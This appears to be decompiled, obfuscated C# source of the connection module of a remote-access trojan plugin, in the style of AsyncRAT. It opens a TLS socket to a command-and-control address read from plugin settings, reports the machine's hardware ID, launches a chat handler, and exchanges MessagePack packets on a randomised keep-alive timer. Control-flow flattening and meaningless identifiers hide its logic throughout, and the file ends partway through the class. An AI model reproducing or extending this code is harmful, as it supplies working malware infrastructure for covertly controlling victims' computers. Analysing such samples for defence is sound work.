using System;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using UY3BiEArlp6B4GPt9k;

namespace Plugin;

public static class Connection
{
	[Serializable]
	[CompilerGenerated]
	private sealed class _003C_003Ec
	{
		public static readonly _003C_003Ec _003C_003E9;

		public static ThreadStart _003C_003E9__39_0;

		internal static _003C_003Ec R8GywsugdjH7aWEtllA;

		[MethodImpl(MethodImplOptions.NoInlining)]
		static _003C_003Ec()
		{
			int num = 1;
			while (true)
			{
				int num2 = num;
				do
				{
					IL_0012:
					switch (num2)
					{
					case 2:
						return;
					case 1:
						break;
					default:
						_003C_003E9 = new _003C_003Ec();
						num2 = 2;
						if (true)
						{
							num2 = 2;
						}
						goto IL_0012;
					}
					g2RttOujUUF5rKKj79Y();
					num2 = 0;
				}
				while (true);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public _003C_003Ec()
		{
			g2RttOujUUF5rKKj79Y();
			base._002Ector();
			int num = 0;
			if (false)
			{
				int num2;
				num = num2;
			}
			switch (num)
			{
			case 0:
				break;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal void _003CInitializeClient_003Eb__39_0()
		{
			int num = 1;
			while (true)
			{
				int num2 = num;
				do
				{
					IL_0012:
					switch (num2)
					{
					case 1:
					{
						MsgPack msgPack = new MsgPack();
						RGyhBauxTW1JipKAmc7(FXvbCouEMxRm5ehc9co(msgPack, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(0)), VjakKJutItqbeoRfNLM(408));
						RGyhBauxTW1JipKAmc7(FXvbCouEMxRm5ehc9co(msgPack, VjakKJutItqbeoRfNLM(56)), Fn3SsduOI8lBJlPXf4O());
						fUQ97su0TlUdp59PRnX(msgPack.Encode2Bytes());
						num2 = 0;
						if (QIajuIuFi9ZSOvd6rI3())
						{
							num2 = 0;
						}
						goto IL_0012;
					}
					case 2:
						return;
					}
					new HandlerChat().CreateChat();
					num2 = 2;
				}
				while (yQBy6IuLpRb90PHbEQn() == null);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void g2RttOujUUF5rKKj79Y()
		{
			WkMgYHbfSUMGdoITRx.UaxVEsuzWFTQk();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static bool QIajuIuFi9ZSOvd6rI3()
		{
			return R8GywsugdjH7aWEtllA == null;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static _003C_003Ec yQBy6IuLpRb90PHbEQn()
		{
			return R8GywsugdjH7aWEtllA;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static object FXvbCouEMxRm5ehc9co(object P_0, object P_1)
		{
			return ((MsgPack)P_0).ForcePathObject((string)P_1);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static object VjakKJutItqbeoRfNLM(int P_0)
		{
			return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void RGyhBauxTW1JipKAmc7(object P_0, object P_1)
		{
			((MsgPack)P_0).AsString = (string)P_1;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static object Fn3SsduOI8lBJlPXf4O()
		{
			return Hwid;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void fUQ97su0TlUdp59PRnX(object P_0)
		{
			Send((byte[])P_0);
		}
	}

	internal static Connection EBZ0vlKh127YE41b8l;

	public static Socket TcpClient
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public static SslStream SslClient
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public static X509Certificate2 ServerCertificate
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	private static byte[] Buffer
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	private static long HeaderSize
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	private static long Offset
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	private static Timer Tick
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public static bool IsConnected
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	private static object SendSync
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
	}

	public static string Hwid
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void InitializeClient()
	{
		switch (1)
		{
		case 1:
			try
			{
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				gfWIxpmLLwXs9yNk8c.UXKaDWyvn(socket, 51200, gfWIxpmLLwXs9yNk8c.afhO5QuJQ);
				gfWIxpmLLwXs9yNk8c.UXKaDWyvn(socket, 51200, gfWIxpmLLwXs9yNk8c.T0uspyWom);
				XcA1mpRCgROLlLwQqG(socket);
				int num = 13;
				if (!fwyhst9ibOicMlaPGr())
				{
					goto IL_0067;
				}
				goto IL_006b;
				IL_0067:
				int num2 = default(int);
				num = num2;
				goto IL_006b;
				IL_006b:
				while (true)
				{
					ThreadStart threadStart;
					switch (num)
					{
					case 11:
						GclwJ7SpG6efamgrCi(new byte[JPJ0AKntfgUWUEmMQv()]);
						num = 6;
						continue;
					case 2:
						daKVLacXg27AdDyId6(new SslStream(new NetworkStream((Socket)ps1ZcZoIFcvKJirZhg(), ownsSocket: true), leaveInnerStreamOpen: false, ValidateServerCertificate));
						num = 2;
						if (UC4Uj67LifCJMXPHfh() == null)
						{
							num = 14;
						}
						continue;
					case 9:
						if (!Ui7lqPXfQCYFUnFcaY.UXKaDWyvn(ps1ZcZoIFcvKJirZhg(), Ui7lqPXfQCYFUnFcaY.YmOKuIRUb))
						{
							num = 10;
							continue;
						}
						goto default;
					case 5:
					case 10:
						KEEqrDmis9RdGo5dFU(value: false);
						num2 = 7;
						break;
					case 6:
						L1xZBBapqBvXHT5ONj(0L);
						num2 = 12;
						break;
					case 14:
						OGBVLZQKYEVKlt7WMt(SslClient, ((string[])xY11PsspMMnImu9H6N(t9MrcAbgnaeXnCLlgI(nyTGP66lHDbLCJfGe1(ps1ZcZoIFcvKJirZhg(), UnZ2uNHSNwfs5f3nYD.upEZVr8dc), vurjld4dlsqMOeBujC.ewbARYsg5), new char[1] { ':' }, dtkNVOyGFWk7vPop5v.nm83FoC1d))[0], null, SslProtocols.Tls, false, BlnXSHil1Yp71Wis0Z.yrVMTskcE);
						num = 3;
						continue;
					case 15:
						EH6tnS8M0lRNQdS4bT.UXKaDWyvn(QSSa97iWoUurgEelD0(), (byte[])BisXtjB3gLQ8RXBlMV(), 0, ((Array)BisXtjB3gLQ8RXBlMV()).Length, ReadServertData, null, EH6tnS8M0lRNQdS4bT.kXltBpdc7);
						num = 4;
						continue;
					case 8:
						return;
					case 3:
						bFwFXc2Rvck4HM16r6(4L);
						num = 11;
						continue;
					case 13:
						RRNGjcQUiFyZeOZKVq.UXKaDWyvn(ps1ZcZoIFcvKJirZhg(), ((string[])xY11PsspMMnImu9H6N(t9MrcAbgnaeXnCLlgI(nyTGP66lHDbLCJfGe1(Plugin.Socket, UnZ2uNHSNwfs5f3nYD.upEZVr8dc), vurjld4dlsqMOeBujC.ewbARYsg5), new char[1] { ':' }, dtkNVOyGFWk7vPop5v.nm83FoC1d))[0], UiEmcCY9lH2nKxPMju(((string[])xY11PsspMMnImu9H6N(vurjld4dlsqMOeBujC.UXKaDWyvn(nyTGP66lHDbLCJfGe1(Plugin.Socket, UnZ2uNHSNwfs5f3nYD.upEZVr8dc), vurjld4dlsqMOeBujC.ewbARYsg5), new char[1] { ':' }, dtkNVOyGFWk7vPop5v.nm83FoC1d))[1], z0kTNR2f7ePPy0RUOp.dJQpxlpsK), RRNGjcQUiFyZeOZKVq.l131sZ5qB);
						num = 9;
						continue;
					default:
						KEEqrDmis9RdGo5dFU(value: true);
						num = 2;
						continue;
					case 12:
						KfcZ1mdkORROu3WJF3(new Timer(CheckServer, null, c9pbwGA1dJ7JmlJHqj(new Random(), 15000, 30000, HIfDjpk0B1nBHpalxw.tpk03Rt8k), c9pbwGA1dJ7JmlJHqj(new Random(), 15000, 30000, HIfDjpk0B1nBHpalxw.tpk03Rt8k)));
						num = 15;
						if (fwyhst9ibOicMlaPGr())
						{
							continue;
						}
						break;
					case 4:
						threadStart = _003C_003Ec._003C_003E9__39_0;
						if (threadStart != null)
						{
							goto IL_0354;
						}
						num = 1;
						if (UC4Uj67LifCJMXPHfh() == null)
						{
							continue;
						}
						break;
					case 1:
						threadStart = (_003C_003Ec._003C_003E9__39_0 = [MethodImpl(MethodImplOptions.NoInlining)] () =>
						{
							int num5 = 1;
							while (true)
							{
								int num6 = num5;
								do
								{
									IL_0012:
									switch (num6)
									{
									case 1:
									{
										MsgPack msgPack = new MsgPack();
										_003C_003Ec.RGyhBauxTW1JipKAmc7(_003C_003Ec.FXvbCouEMxRm5ehc9co(msgPack, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(0)), _003C_003Ec.VjakKJutItqbeoRfNLM(408));
										_003C_003Ec.RGyhBauxTW1JipKAmc7(_003C_003Ec.FXvbCouEMxRm5ehc9co(msgPack, _003C_003Ec.VjakKJutItqbeoRfNLM(56)), _003C_003Ec.Fn3SsduOI8lBJlPXf4O());
										_003C_003Ec.fUQ97su0TlUdp59PRnX(msgPack.Encode2Bytes());
										num6 = 0;
										if (_003C_003Ec.QIajuIuFi9ZSOvd6rI3())
										{
											num6 = 0;
										}
										goto IL_0012;
									}
									case 2:
										return;
									}
									new HandlerChat().CreateChat();
									num6 = 2;
								}
								while (_003C_003Ec.yQBy6IuLpRb90PHbEQn() == null);
							}
						});
						goto IL_0354;
					case 7:
						return;
						IL_0354:
						rw5tcZVJaEkNI8B1Xd.UXKaDWyvn(new Thread(threadStart), rw5tcZVJaEkNI8B1Xd.MfeqR70LU);
						num = 8;
						continue;
					}
					break;
				}
				goto IL_0067;
			}
			catch
			{
				int num3 = 0;
				if (fwyhst9ibOicMlaPGr())
				{
					num3 = 0;
				}
				int num4 = default(int);
				while (true)
				{
					switch (num3)
					{
					case 1:
						return;
					}
					KEEqrDmis9RdGo5dFU(value: false);
					num3 = 1;
					if (UC4Uj67LifCJMXPHfh() != null)
					{
						num3 = num4;
					}
				}
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static bool ValidateServerCertificate(object sender, object certificate, object chain, SslPolicyErrors sslPolicyErrors)
	{
		return Rr4BtxfAvsNArt8Oog(uD3PIQ4FnuQTFylDS2(), certificate, APrifndOkXLf6O9iex.dt5lI77lm);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Disconnected()
	{
		switch (1)
		{
		case 1:
			try
			{
				KEEqrDmis9RdGo5dFU(value: false);
				int num = 1;
				if (!fwyhst9ibOicMlaPGr())
				{
					goto IL_0040;
				}
				goto IL_0044;
				IL_0040:
				int num2 = default(int);
				num = num2;
				goto IL_0044;
				IL_0044:
				while (true)
				{
					switch (num)
					{
					case 4:
					case 5:
					{
						object obj2 = QSSa97iWoUurgEelD0();
						if (obj2 == null)
						{
							num = 6;
							if (fwyhst9ibOicMlaPGr())
							{
								num = 6;
							}
							continue;
						}
						jw0D4mDr6SOPgvxBRK(obj2, rw5tcZVJaEkNI8B1Xd.cAUbJvNfh);
						num = 0;
						if (fwyhst9ibOicMlaPGr())
						{
							num = 0;
						}
						continue;
					}
					case 1:
					{
						object obj = b8rBvnUZ5xcDrlFn2Z();
						if (obj == null)
						{
							num = 5;
							continue;
						}
						jw0D4mDr6SOPgvxBRK(obj, rw5tcZVJaEkNI8B1Xd.gHafMWJ27);
						num = 4;
						continue;
					}
					case 2:
						return;
					case 3:
						return;
					}
					Socket tcpClient = TcpClient;
					if (tcpClient == null)
					{
						num = 2;
						if (UC4Uj67LifCJMXPHfh() != null)
						{
							break;
						}
					}
					else
					{
						jw0D4mDr6SOPgvxBRK(tcpClient, rw5tcZVJaEkNI8B1Xd.JkGwaO2yw);
						num = 3;
					}
				}
				goto IL_0040;
			}
			catch
			{
				int num3 = 0;
				if (!fwyhst9ibOicMlaPGr())
				{
					int num4 = default(int);
					num3 = num4;
				}
				switch (num3)
				{
				case 0:
					break;
				}
				break;
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void ReadServertData(IAsyncResult ar)
	{
		switch (1)
		{
		case 1:
			try
			{
				int num;
				if (!sWEZLMgIS99OYqWDb9(ps1ZcZoIFcvKJirZhg(), Ui7lqPXfQCYFUnFcaY.YmOKuIRUb))
				{
					num = 32;
					goto IL_0047;
				}
				goto IL_0347;
				IL_0347:
				if (!dvKfbgFUjxu5bBF8fs())
				{
					num = 2;
					goto IL_0047;
				}
				goto IL_03f6;
				IL_0047:
				int num4 = default(int);
				int num3 = default(int);
				int num2 = default(int);
				while (true)
				{
					switch (num)
					{
					case 42:
						if (JPJ0AKntfgUWUEmMQv() >= 0)
						{
							num = 10;
							continue;
						}
						goto case 37;
					case 18:
						Offset = ctsbKCLYgJMt8wDWuO() + num4;
						num = 6;
						continue;
					case 7:
						return;
					case 17:
						bFwFXc2Rvck4HM16r6(JPJ0AKntfgUWUEmMQv() - num3);
						num = 26;
						if (UC4Uj67LifCJMXPHfh() == null)
						{
							continue;
						}
						goto IL_0043;
					case 5:
					case 10:
					case 23:
					case 41:
						hRxPbOtE9OZ3JAvBUk(QSSa97iWoUurgEelD0(), Buffer, (int)Offset, (int)HeaderSize, new AsyncCallback(ReadServertData), null, EH6tnS8M0lRNQdS4bT.kXltBpdc7);
						num = 11;
						if (fwyhst9ibOicMlaPGr())
						{
							continue;
						}
						goto IL_0043;
					case 1:
						L1xZBBapqBvXHT5ONj(0L);
						num = 5;
						if (fwyhst9ibOicMlaPGr())
						{
							continue;
						}
						goto IL_0043;
					case 2:
					case 32:
						KEEqrDmis9RdGo5dFU(value: false);
						num = 35;
						if (UC4Uj67LifCJMXPHfh() == null)
						{
							continue;
						}
						goto IL_0043;
					case 38:
						HeaderSize = rZqfcyTLiW4FVnCWAw.UXKaDWyvn(Buffer, 0, rZqfcyTLiW4FVnCWAw.EYa7dM0Ne);
						num = 4;
						continue;
					case 35:
						return;
					case 43:
						xwenNuEAWViSNfdV7p(new Thread(Packet.Read), BisXtjB3gLQ8RXBlMV(), dPGWyBvh9ZZ1motMaa.LMwWnZZc5);
						num = 24;
						if (!fwyhst9ibOicMlaPGr())
						{
							num = 4;
						}
						continue;
					case 16:
						Offset = 0L;
						num = 0;
						if (fwyhst9ibOicMlaPGr())
						{
							continue;
						}
						goto IL_0043;
					case 27:
						if (num4 > 0)
						{
							num = 18;
							continue;
						}
						goto case 3;
					case 9:
					case 14:
						if (JPJ0AKntfgUWUEmMQv() > 0)
						{
							num = 36;
							continue;
						}
						goto case 43;
					case 22:
						IsConnected = false;
						num = 39;
						continue;
					case 4:
						if (HeaderSize <= 0)
						{
							num = 12;
							continue;
						}
						goto case 16;
					case 28:
						if (num3 > 0)
						{
							num = 15;
							continue;
						}
						goto case 22;
					case 31:
						break;
					case 11:
						return;
					case 26:
						if (HeaderSize < 0)
						{
							num = 20;
							if (UC4Uj67LifCJMXPHfh() == null)
							{
								continue;
							}
							goto IL_0043;
						}
						goto case 9;
					case 3:
						KEEqrDmis9RdGo5dFU(value: false);
						num = 8;
						continue;
					default:
						GclwJ7SpG6efamgrCi(new byte[HeaderSize]);
						num = 9;
						continue;
					case 6:
						bFwFXc2Rvck4HM16r6(JPJ0AKntfgUWUEmMQv() - num4);
						num = 19;
						continue;
					case 39:
						return;
					case 21:
						goto IL_03f6;
					case 37:
						KEEqrDmis9RdGo5dFU(value: false);
						num = 7;
						continue;
					case 24:
						Offset = 0L;
						num = 33;
						if (fwyhst9ibOicMlaPGr())
						{
							num = 40;
						}
						continue;
					case 15:
					case 29:
						L1xZBBapqBvXHT5ONj(ctsbKCLYgJMt8wDWuO() + num3);
						num = 17;
						continue;
					case 25:
						GclwJ7SpG6efamgrCi(new byte[JPJ0AKntfgUWUEmMQv()]);
						num = 1;
						if (fwyhst9ibOicMlaPGr())
						{
							continue;
						}
						goto IL_0043;
					case 33:
						Buffer = new byte[HeaderSize];
						num = 8;
						if (UC4Uj67LifCJMXPHfh() == null)
						{
							num = 41;
						}
						continue;
					case 30:
					case 36:
						num3 = AOc1hCjcpW7H2Hn9qu(QSSa97iWoUurgEelD0(), BisXtjB3gLQ8RXBlMV(), (int)ctsbKCLYgJMt8wDWuO(), (int)JPJ0AKntfgUWUEmMQv(), A6kNklrEFJHXMgRquE.vw0NnRe3j);
						num2 = 28;
						goto IL_0043;
					case 40:
						bFwFXc2Rvck4HM16r6(4L);
						num = 33;
						continue;
					case 13:
						return;
					case 12:
					case 34:
						bFwFXc2Rvck4HM16r6(4L);
						num = 25;
						continue;
					case 19:
						if (JPJ0AKntfgUWUEmMQv() == 0L)
						{
							num2 = 38;
							goto IL_0043;
						}
						goto case 42;
					case 20:
						KEEqrDmis9RdGo5dFU(value: false);
						num = 13;
						if (UC4Uj67LifCJMXPHfh() == null)
						{
							continue;
						}
						goto IL_0043;
					case 8:
						return;
						IL_0043:
						num = num2;
						continue;
					}
					break;
				}
				goto IL_0347;
				IL_03f6:
				num4 = aYBljUuLTlj9tdQgjc.UXKaDWyvn(QSSa97iWoUurgEelD0(), ar, aYBljUuLTlj9tdQgjc.EuLjn9nek);
				num = 27;
				goto IL_0047;
			}
			catch
			{
				int num5 = 1;
				if (!fwyhst9ibOicMlaPGr())
				{
					goto IL_057b;
				}
				goto IL_057f;
				IL_057b:
				int num6 = default(int);
				num5 = num6;
				goto IL_057f;
				IL_057f:
				do
				{
					switch (num5)
					{
					default:
						return;
					case 1:
						break;
					case 0:
						return;
					}
					KEEqrDmis9RdGo5dFU(value: false);
					num5 = 0;
				}
				while (fwyhst9ibOicMlaPGr());
				goto IL_057b;
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Send(byte[] msg)
	{
		int num = 1;
		object sendSync = default(object);
		bool flag = default(bool);
		int num4 = default(int);
		int num6 = default(int);
		int num9 = default(int);
		MemoryStream memoryStream = default(MemoryStream);
		byte[] array = default(byte[]);
		int num11 = default(int);
		byte[] array2 = default(byte[]);
		int num13 = default(int);
		int num15 = default(int);
		while (true)
		{
			int num2 = num;
			do
			{
				IL_0012:
				switch (num2)
				{
				case 2:
					try
					{
						Qb0N7W6rWj3A20tYbF.UXKaDWyvn(sendSync, ref flag, Qb0N7W6rWj3A20tYbF.SciLpvpHC);
						int num3 = 0;
						if (!fwyhst9ibOicMlaPGr())
						{
							num3 = num4;
						}
						switch (num3)
						{
						default:
							try
							{
								int num5;
								if (!dvKfbgFUjxu5bBF8fs())
								{
									num5 = 9;
									goto IL_007b;
								}
								goto IL_02f2;
								IL_0077:
								num5 = num6;
								goto IL_007b;
								IL_007b:
								while (true)
								{
									switch (num5)
									{
									default:
										return;
									case 1:
										try
										{
											int num7 = 0;
											int num8 = 5;
											if (UC4Uj67LifCJMXPHfh() != null)
											{
												goto IL_00d6;
											}
											goto IL_00da;
											IL_00d6:
											num8 = num9;
											goto IL_00da;
											IL_00da:
											while (true)
											{
												switch (num8)
												{
												default:
													if ((num7 = AOc1hCjcpW7H2Hn9qu(memoryStream, array, 0, array.Length, A6kNklrEFJHXMgRquE.vw0NnRe3j)) <= 0)
													{
														num9 = 4;
														break;
													}
													goto case 2;
												case 5:
													HrEpPH1r20RlbpYOyv(memoryStream, 0L, VMIavUShyfAK7jTNOG.qmwGcKTwr);
													num8 = 1;
													if (UC4Uj67LifCJMXPHfh() == null)
													{
														continue;
													}
													break;
												case 1:
													array = new byte[50000];
													num8 = 6;
													continue;
												case 2:
													qOOOSoOhy7KXjpO2rk(ps1ZcZoIFcvKJirZhg(), -1, SelectMode.SelectWrite, AWUfbsgbPbiqqAK2JI.WLV9oHN2X);
													num8 = 7;
													continue;
												case 3:
													jw0D4mDr6SOPgvxBRK(QSSa97iWoUurgEelD0(), rw5tcZVJaEkNI8B1Xd.U31Rl5ae1);
													num8 = 0;
													if (fwyhst9ibOicMlaPGr())
													{
														continue;
													}
													break;
												case 7:
													NrSUCvBnrsCvCySv28.UXKaDWyvn(QSSa97iWoUurgEelD0(), array, 0, num7, NrSUCvBnrsCvCySv28.UvcDiqb8S);
													num8 = 3;
													continue;
												case 4:
													return;
												}
												break;
											}
											goto IL_00d6;
										}
										finally
										{
											if (memoryStream != null)
											{
												int num10 = 0;
												if (fwyhst9ibOicMlaPGr())
												{
													num10 = 1;
												}
												while (true)
												{
													switch (num10)
													{
													case 1:
														jw0D4mDr6SOPgvxBRK(memoryStream, rw5tcZVJaEkNI8B1Xd.tCpxoHWdj);
														num10 = 0;
														if (UC4Uj67LifCJMXPHfh() != null)
														{
															num10 = num11;
														}
														continue;
													case 0:
														break;
													}
													break;
												}
											}
										}
									case 8:
										break;
									case 6:
										jw0D4mDr6SOPgvxBRK(SslClient, rw5tcZVJaEkNI8B1Xd.U31Rl5ae1);
										num5 = 0;
										if (!fwyhst9ibOicMlaPGr())
										{
											num5 = 0;
										}
										continue;
									case 3:
										if (msg.Length <= 1000000)
										{
											num5 = 12;
											continue;
										}
										goto IL_0345;
									case 11:
									case 12:
										qOOOSoOhy7KXjpO2rk(ps1ZcZoIFcvKJirZhg(), -1, SelectMode.SelectWrite, AWUfbsgbPbiqqAK2JI.WLV9oHN2X);
										num5 = 4;
										continue;
									case 5:
										goto IL_02c7;
									case 7:
										goto IL_02f2;
									case 9:
										return;
									case 10:
										return;
									case 13:
										goto IL_0345;
									case 2:
										goto IL_0362;
									case 4:
										goto IL_0389;
									case 0:
										return;
									}
									break;
									IL_0389:
									VQk59f0X7Q1XA8HXec(SslClient, msg, 0, msg.Length, NrSUCvBnrsCvCySv28.UvcDiqb8S);
									num5 = 6;
									if (fwyhst9ibOicMlaPGr())
									{
										continue;
									}
									goto IL_0077;
									IL_0362:
									qOOOSoOhy7KXjpO2rk(ps1ZcZoIFcvKJirZhg(), -1, SelectMode.SelectWrite, AWUfbsgbPbiqqAK2JI.WLV9oHN2X);
									num5 = 5;
									if (fwyhst9ibOicMlaPGr())
									{
										continue;
									}
									goto IL_0077;
									IL_02c7:
									VQk59f0X7Q1XA8HXec(QSSa97iWoUurgEelD0(), array2, 0, array2.Length, NrSUCvBnrsCvCySv28.UvcDiqb8S);
									num5 = 3;
									if (fwyhst9ibOicMlaPGr())
									{
										continue;
									}
									goto IL_0077;
									IL_0345:
									memoryStream = new MemoryStream(msg);
									num5 = 1;
									if (fwyhst9ibOicMlaPGr())
									{
										continue;
									}
									goto IL_0077;
								}
								goto IL_0252;
								IL_02f2:
								if (msg == null)
								{
									num5 = 10;
									if (UC4Uj67LifCJMXPHfh() != null)
									{
										goto IL_0077;
									}
									goto IL_007b;
								}
								goto IL_0252;
								IL_0252:
								array2 = (byte[])b6MQB1ximmwlJ1DChE(msg.Length, Ee9a1uhHn2GctWJDsm.zC3oOT5yM);
								num5 = 2;
								goto IL_007b;
							}
							catch
							{
								int num12 = 1;
								if (UC4Uj67LifCJMXPHfh() != null)
								{
									goto IL_03cd;
								}
								goto IL_03d1;
								IL_03cd:
								num12 = num13;
								goto IL_03d1;
								IL_03d1:
								do
								{
									switch (num12)
									{
									default:
										return;
									case 1:
										break;
									case 0:
										return;
									}
									KEEqrDmis9RdGo5dFU(value: false);
									num12 = 0;
								}
								while (fwyhst9ibOicMlaPGr());
								goto IL_03cd;
							}
						}
					}
					finally
					{
						int num14;
						if (!flag)
						{
							num14 = 0;
							if (UC4Uj67LifCJMXPHfh() != null)
							{
								goto IL_041f;
							}
							goto IL_0423;
						}
						goto IL_0458;
						IL_0458:
						V5oPk1IivL44y9oknB(sendSync, xeyUgBcASKDwoPHPqg.dOmYqgeIe);
						num14 = 1;
						if (UC4Uj67LifCJMXPHfh() != null)
						{
							goto IL_041f;
						}
						goto IL_0423;
						IL_041f:
						num14 = num15;
						goto IL_0423;
						IL_0423:
						switch (num14)
						{
						default:
							goto end_IL_0403;
						case 0:
							goto end_IL_0403;
						case 2:
							break;
						case 1:
							goto end_IL_0403;
						}
						goto IL_0458;
						end_IL_0403:;
					}
				case 1:
					break;
				default:
					flag = false;
					num2 = 0;
					if (UC4Uj67LifCJMXPHfh() == null)
					{
						num2 = 2;
					}
					goto IL_0012;
				case 3:
					return;
				}
				sendSync = SendSync;
				num2 = 0;
			}
			while (UC4Uj67LifCJMXPHfh() == null);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void CheckServer(object obj)
	{
		int num = 1;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					x5O3JZknR8Io0GAdnn(bBmXb7EBty0gQq3Dng.ErVUGTT2i);
					num2 = 2;
					if (UC4Uj67LifCJMXPHfh() == null)
					{
						continue;
					}
					break;
				case 2:
					return;
				case 1:
				{
					MsgPack msgPack = new MsgPack();
					((MsgPack)gfDV2oCRVbdQw7qs0h(msgPack, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(0))).AsString = (string)XqSqilpTOS6Q83sPBh(16);
					XMemSEVFkn9tKno7ys(msgPack.Encode2Bytes());
					num2 = 0;
					if (UC4Uj67LifCJMXPHfh() == null)
					{
						continue;
					}
					break;
				}
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	static Connection()
	{
		int num = 1;
		while (true)
		{
			int num2 = num;
			do
			{
				IL_0012:
				switch (num2)
				{
				case 2:
					return;
				case 1:
					break;
				default:
					SendSync = new object();
					num2 = 2;
					if (0 == 0)
					{
						num2 = 2;
					}
					goto IL_0012;
				}
				jLXUR5GDBrQZSTFHS3();
				num2 = 0;
			}
			while (true);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void XcA1mpRCgROLlLwQqG(object P_0)
	{
		TcpClient = (Socket)P_0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object ps1ZcZoIFcvKJirZhg()
	{
		return TcpClient;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object nyTGP66lHDbLCJfGe1(object P_0, object P_1)
	{
		return UnZ2uNHSNwfs5f3nYD.UXKaDWyvn(P_0, (UnZ2uNHSNwfs5f3nYD)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object t9MrcAbgnaeXnCLlgI(object P_0, object P_1)
	{
		return vurjld4dlsqMOeBujC.UXKaDWyvn(P_0, (vurjld4dlsqMOeBujC)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object xY11PsspMMnImu9H6N(object P_0, object P_1, object P_2)
	{
		return dtkNVOyGFWk7vPop5v.UXKaDWyvn(P_0, (char[])P_1, (dtkNVOyGFWk7vPop5v)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int UiEmcCY9lH2nKxPMju(object P_0, object P_1)
	{
		return z0kTNR2f7ePPy0RUOp.UXKaDWyvn((string)P_0, (z0kTNR2f7ePPy0RUOp)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void KEEqrDmis9RdGo5dFU(bool value)
	{
		IsConnected = value;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void daKVLacXg27AdDyId6(object P_0)
	{
		SslClient = (SslStream)P_0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void OGBVLZQKYEVKlt7WMt(object P_0, object P_1, object P_2, SslProtocols P_3, bool P_4, object P_5)
	{
		BlnXSHil1Yp71Wis0Z.UXKaDWyvn(P_0, (string)P_1, (X509CertificateCollection)P_2, P_3, P_4, (BlnXSHil1Yp71Wis0Z)P_5);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void bFwFXc2Rvck4HM16r6(long value)
	{
		HeaderSize = value;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long JPJ0AKntfgUWUEmMQv()
	{
		return HeaderSize;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void GclwJ7SpG6efamgrCi(object P_0)
	{
		Buffer = (byte[])P_0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void L1xZBBapqBvXHT5ONj(long value)
	{
		Offset = value;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int c9pbwGA1dJ7JmlJHqj(object P_0, int P_1, int P_2, object P_3)
	{
		return HIfDjpk0B1nBHpalxw.UXKaDWyvn(P_0, P_1, P_2, (HIfDjpk0B1nBHpalxw)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void KfcZ1mdkORROu3WJF3(object P_0)
	{
		Tick = (Timer)P_0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object QSSa97iWoUurgEelD0()
	{
		return SslClient;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object BisXtjB3gLQ8RXBlMV()
	{
		return Buffer;
	}

